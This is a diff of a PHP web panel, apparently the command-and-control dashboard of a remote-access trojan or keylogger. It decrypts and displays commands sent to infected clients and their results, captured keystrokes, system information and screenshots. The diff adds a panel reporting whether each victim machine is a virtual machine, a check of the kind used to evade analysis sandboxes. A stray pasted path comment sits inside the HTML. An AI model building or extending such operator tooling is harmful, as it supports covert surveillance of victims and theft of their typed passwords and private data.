@@ -28,7 +28,8 @@ try {
 }
 
 // Decrypt function
-function decrypt($encryptedData, $key) {
+function decrypt($encryptedData, $key)
+{
     try {
         if (!$encryptedData || !is_string($encryptedData)) {
             error_log("Decrypt: No data or invalid type: " . var_export($encryptedData, true), 3, Config::$ERROR_LOG);
@@ -122,7 +123,8 @@ function decrypt($encryptedData, $key) {
 }
 
 // Format JSON for download
-function formatJsonForDownload($jsonString) {
+function formatJsonForDownload($jsonString)
+{
     $jsonDecoded = json_decode($jsonString, true);
     if ($jsonDecoded === null) {
         return $jsonString;
@@ -172,13 +174,13 @@ if (isset($_GET['get_logs']) && $logged_in) {
             ORDER BY created_at DESC LIMIT 100
         ");
         $logs = $stmt->fetchAll();
-        
+
         foreach ($logs as &$log) {
             $log['raw_result'] = $log['result'];
             $log['command'] = decrypt($log['command'], Config::$ENCRYPTION_KEY);
             $log['result'] = $log['result'] ? decrypt($log['result'], Config::$ENCRYPTION_KEY) : '';
         }
-        
+
         echo json_encode(['logs' => $logs], JSON_UNESCAPED_UNICODE);
     } catch (PDOException $e) {
         error_log("Failed to fetch logs: " . $e->getMessage(), 3, Config::$ERROR_LOG);
@@ -197,7 +199,7 @@ if (isset($_GET['get_user_data']) && $logged_in) {
             ORDER BY created_at DESC LIMIT 100
         ");
         $user_data = $stmt->fetchAll();
-        
+
         foreach ($user_data as &$data) {
             $data['raw_keystrokes'] = $data['keystrokes'];
             $data['raw_system_info'] = $data['system_info'];
@@ -210,11 +212,33 @@ if (isset($_GET['get_user_data']) && $logged_in) {
                 $data['screenshot_url'] = '';
             }
         }
-        
+
         echo json_encode(['user_data' => $user_data], JSON_UNESCAPED_UNICODE);
     } catch (PDOException $e) {
         error_log("Failed to fetch user data: " . $e->getMessage(), 3, Config::$ERROR_LOG);
         echo json_encode(['error' => 'Failed to fetch user data: ' . htmlspecialchars($e->getMessage())], JSON_UNESCAPED_UNICODE);
+    }
+    exit;
+}
+
+if (isset($_GET['get_vm_status']) && $logged_in) {
+    header('Content-Type: application/json; charset=utf-8');
+    try {
+        $stmt = $pdo->query("
+            SELECT client_id, vm_details, created_at
+            FROM client_vm_status
+            ORDER BY created_at DESC LIMIT 100
+        ");
+        $vm_status = $stmt->fetchAll();
+
+        foreach ($vm_status as &$status) {
+            $status['vm_details'] = $status['vm_details'] ? decrypt($status['vm_details'], Config::$ENCRYPTION_KEY) : '';
+        }
+
+        echo json_encode(['vm_status' => $vm_status], JSON_UNESCAPED_UNICODE);
+    } catch (PDOException $e) {
+        error_log("Failed to fetch VM status: " . $e->getMessage(), 3, Config::$ERROR_LOG);
+        echo json_encode(['error' => 'Failed to fetch VM status: ' . htmlspecialchars($e->getMessage())], JSON_UNESCAPED_UNICODE);
     }
     exit;
 }
@@ -302,6 +326,7 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
 
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -314,6 +339,7 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
             background-attachment: fixed;
             backdrop-filter: blur(5px);
         }
+
         .glass-card {
             background: rgba(10, 10, 10, 0.7);
             backdrop-filter: blur(10px);
@@ -321,19 +347,25 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
             box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
             animation: slide-up 0.8s ease-out;
         }
-        .log-entry, .data-entry {
+
+        .log-entry,
+        .data-entry {
             transition: transform 0.3s ease;
             cursor: pointer;
         }
-        .log-entry:hover, .data-entry:hover {
+
+        .log-entry:hover,
+        .data-entry:hover {
             transform: translateY(-5px);
         }
+
         .black-hole-glow {
             background: linear-gradient(45deg, #ffd700, #8b4513, #000000);
             -webkit-text-fill-color: transparent;
             -webkit-background-clip: text;
             animation: pulse-glow 3s infinite ease-in-out;
         }
+
         .modal {
             display: none;
             position: fixed;
@@ -345,6 +377,7 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
             z-index: 50;
             animation: zoom-in 0.5s ease-out;
         }
+
         .modal-content {
             background: rgba(20, 20, 20, 0.95);
             backdrop-filter: blur(10px);
@@ -357,6 +390,7 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
             overflow-y: auto;
             border-radius: 10px;
         }
+
         .editor {
             background: #1e1e1e;
             color: #d4d4d4;
@@ -370,11 +404,13 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
             width: 100%;
             border: 1px solid rgba(255, 215, 0, 0.2);
         }
+
         .tabs {
             display: flex;
             gap: 10px;
             margin-bottom: 10px;
         }
+
         .tab {
             padding: 8px 16px;
             background: #2d2d2d;
@@ -382,64 +418,79 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
             cursor: pointer;
             transition: background 0.3s;
         }
+
         .tab:hover {
             background: #4a4a4a;
         }
+
         .tab.active {
             background: #ffd700;
             color: #000;
         }
+
         .screenshot-img {
             max-width: 100%;
             height: auto;
             border-radius: 5px;
             border: 1px solid rgba(255, 215, 0, 0.2);
         }
+
         @keyframes slide-up {
             from {
                 opacity: 0;
                 transform: translateY(20px);
             }
+
             to {
                 opacity: 1;
                 transform: translateY(0);
             }
         }
+
         @keyframes pulse-glow {
-            0%, 100% {
+
+            0%,
+            100% {
                 background: linear-gradient(45deg, #ffd700, #8b4513, #000000);
                 -webkit-background-clip: text;
                 filter: brightness(1);
             }
+
             50% {
                 background: linear-gradient(45deg, #ffa500, #654321, #000000);
                 -webkit-background-clip: text;
                 filter: brightness(1.5);
             }
         }
+
         @keyframes zoom-in {
             from {
                 opacity: 0;
                 transform: scale(0.8);
             }
+
             to {
                 opacity: 1;
                 transform: scale(1);
             }
         }
+
         .fade-in {
             animation: fade-in 1s ease-out;
         }
+
         @keyframes fade-in {
             from {
                 opacity: 0;
             }
+
             to {
                 opacity: 1;
             }
         }
     </style>
 </head>
+
 <body class="min-h-screen text-gray-200 flex flex-col">
     <div class="container mx-auto p-4 flex-grow">
         <?php if (!$logged_in): ?>
@@ -453,10 +504,10 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
                     <div>
                         <label for="password" class="block text-sm font-medium">Password</label>
                         <input type="password" id="password" name="password" required
-                               class="w-full mt-1 p-2 rounded-md bg-gray-800 border border-gray-600 focus:outline-none focus:ring-2 focus:ring-yellow-500">
+                            class="w-full mt-1 p-2 rounded-md bg-gray-800 border border-gray-600 focus:outline-none focus:ring-2 focus:ring-yellow-500">
                     </div>
                     <button type="submit"
-                            class="w-full py-2 px-4 bg-yellow-600 hover:bg-yellow-700 rounded-md text-white font-semibold">
+                        class="w-full py-2 px-4 bg-yellow-600 hover:bg-yellow-700 rounded-md text-white font-semibold">
                         Login
                     </button>
                 </form>
@@ -474,6 +525,11 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
                 <div class="glass-card rounded-xl p-6">
                     <h2 class="text-2xl font-semibold text-green-400 mb-4">Completed Commands</h2>
                     <div id="completed-logs" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
+                </div>
+                # server/log-viewer.php (در بخش HTML، داخل div.grid)
+                <div class="glass-card rounded-xl p-6">
+                    <h2 class="text-2xl font-semibold text-purple-400 mb-4">VM Detection Status</h2>
+                    <div id="vm-status" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                 </div>
                 <!-- Pending logs -->
                 <div class="glass-card rounded-xl p-6">
@@ -552,29 +608,31 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
             function fetchLogsAndData() {
                 // Fetch command logs
                 fetch('?get_logs', {
-                    method: 'GET',
-                    headers: { 'Accept': 'application/json' }
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.error) {
-                        console.error(data.error);
-                        return;
-                    }
+                        method: 'GET',
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.error) {
+                            console.error(data.error);
+                            return;
+                        }
 
-                    const completedLogs = document.getElementById('completed-logs');
-                    const pendingLogs = document.getElementById('pending-logs');
-                    const failedLogs = document.getElementById('failed-logs');
+                        const completedLogs = document.getElementById('completed-logs');
+                        const pendingLogs = document.getElementById('pending-logs');
+                        const failedLogs = document.getElementById('failed-logs');
 
-                    completedLogs.innerHTML = '';
-                    pendingLogs.innerHTML = '';
-                    failedLogs.innerHTML = '';
+                        completedLogs.innerHTML = '';
+                        pendingLogs.innerHTML = '';
+                        failedLogs.innerHTML = '';
 
-                    data.logs.forEach(log => {
-                        const logElement = document.createElement('div');
-                        logElement.className = 'log-entry p-3 rounded-md bg-gray-900/50 border border-gray-700';
-                        logElement.dataset.log = JSON.stringify(log);
-                        logElement.innerHTML = `
+                        data.logs.forEach(log => {
+                            const logElement = document.createElement('div');
+                            logElement.className = 'log-entry p-3 rounded-md bg-gray-900/50 border border-gray-700';
+                            logElement.dataset.log = JSON.stringify(log);
+                            logElement.innerHTML = `
                             <p class="text-sm text-gray-400">${new Date(log.created_at).toLocaleString()}</p>
                             <p class="text-gray-200"><strong>Client ID:</strong> ${log.client_id}</p>
                             <p class="text-gray-200"><strong>Command:</strong> ${log.command}</p>
@@ -582,22 +640,58 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
                             <p class="text-gray-200"><strong>Status:</strong> ${log.status}</p>
                         `;
 
-                        if (log.status === 'completed') {
-                            logElement.addEventListener('click', () => openLogModal(log));
-                            completedLogs.appendChild(logElement);
-                        } else if (log.status === 'pending') {
-                            pendingLogs.appendChild(logElement);
-                        } else if (log.status === 'failed') {
-                            failedLogs.appendChild(logElement);
-                        }
-                    });
-                })
-                .catch(error => console.error('Error fetching logs:', error));
+                            if (log.status === 'completed') {
+                                logElement.addEventListener('click', () => openLogModal(log));
+                                completedLogs.appendChild(logElement);
+                            } else if (log.status === 'pending') {
+                                pendingLogs.appendChild(logElement);
+                            } else if (log.status === 'failed') {
+                                failedLogs.appendChild(logElement);
+                            }
+                        });
+                    })
+                    .catch(error => console.error('Error fetching logs:', error));
 
                 // Fetch user data
                 fetch('?get_user_data', {
+                        method: 'GET',
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.error) {
+                            console.error(data.error);
+                            return;
+                        }
+
+                        const clientData = document.getElementById('client-data');
+                        clientData.innerHTML = '';
+
+                        data.user_data.forEach(item => {
+                            const dataElement = document.createElement('div');
+                            dataElement.className = 'data-entry p-3 rounded-md bg-gray-900/50 border border-gray-700';
+                            dataElement.dataset.data = JSON.stringify(item);
+                            dataElement.innerHTML = `
+                            <p class="text-sm text-gray-400">${new Date(item.created_at).toLocaleString()}</p>
+                            <p class="text-gray-200"><strong>Client ID:</strong> ${item.client_id}</p>
+                            <p class="text-gray-200"><strong>Keystrokes:</strong> ${item.keystrokes.substring(0, 100)}${item.keystrokes.length > 100 ? '...' : ''}</p>
+                            <p class="text-gray-200"><strong>System Info:</strong> ${item.system_info.substring(0, 100)}${item.system_info.length > 100 ? '...' : ''}</p>
+                            <p class="text-gray-200"><strong>Screenshot:</strong> ${item.screenshot_url ? 'Available' : 'None'}</p>
+                        `;
+
+                            dataElement.addEventListener('click', () => openDataModal(item));
+                            clientData.appendChild(dataElement);
+                        });
+                    })
+                    .catch(error => console.error('Error fetching user data:', error));
+            }
+            fetch('?get_vm_status', {
                     method: 'GET',
-                    headers: { 'Accept': 'application/json' }
+                    headers: {
+                        'Accept': 'application/json'
+                    }
                 })
                 .then(response => response.json())
                 .then(data => {
@@ -606,27 +700,23 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
                         return;
                     }
 
-                    const clientData = document.getElementById('client-data');
-                    clientData.innerHTML = '';
+                    const vmStatus = document.getElementById('vm-status');
+                    vmStatus.innerHTML = '';
 
-                    data.user_data.forEach(item => {
-                        const dataElement = document.createElement('div');
-                        dataElement.className = 'data-entry p-3 rounded-md bg-gray-900/50 border border-gray-700';
-                        dataElement.dataset.data = JSON.stringify(item);
-                        dataElement.innerHTML = `
-                            <p class="text-sm text-gray-400">${new Date(item.created_at).toLocaleString()}</p>
-                            <p class="text-gray-200"><strong>Client ID:</strong> ${item.client_id}</p>
-                            <p class="text-gray-200"><strong>Keystrokes:</strong> ${item.keystrokes.substring(0, 100)}${item.keystrokes.length > 100 ? '...' : ''}</p>
-                            <p class="text-gray-200"><strong>System Info:</strong> ${item.system_info.substring(0, 100)}${item.system_info.length > 100 ? '...' : ''}</p>
-                            <p class="text-gray-200"><strong>Screenshot:</strong> ${item.screenshot_url ? 'Available' : 'None'}</p>
-                        `;
-
-                        dataElement.addEventListener('click', () => openDataModal(item));
-                        clientData.appendChild(dataElement);
+                    data.vm_status.forEach(status => {
+                        const statusElement = document.createElement('div');
+                        statusElement.className = 'vm-status-entry p-3 rounded-md bg-gray-900/50 border border-gray-700';
+                        const isVM = JSON.parse(status.vm_details).is_vm ? 'Virtual Machine 🕵️' : 'Physical Machine ✅';
+                        statusElement.innerHTML = `
+                <p class="text-sm text-gray-400">${new Date(status.created_at).toLocaleString()}</p>
+                <p class="text-gray-200"><strong>Client ID:</strong> ${status.client_id}</p>
+                <p class="text-gray-200"><strong>Status:</strong> ${isVM}</p>
+                <p class="text-gray-200"><strong>Details:</strong> ${status.vm_details.substring(0, 100)}${status.vm_details.length > 100 ? '...' : ''}</p>
+            `;
+                        vmStatus.appendChild(statusElement);
                     });
                 })
-                .catch(error => console.error('Error fetching user data:', error));
-            }
+                .catch(error => console.error('Error fetching VM status:', error));
 
             function openLogModal(log) {
                 const modal = document.getElementById('log-modal');
@@ -730,4 +820,5 @@ if (isset($_GET['download_user_data']) && $logged_in && isset($_GET['data_id']))
         </script>
     <?php endif; ?>
 </body>
+
 </html>
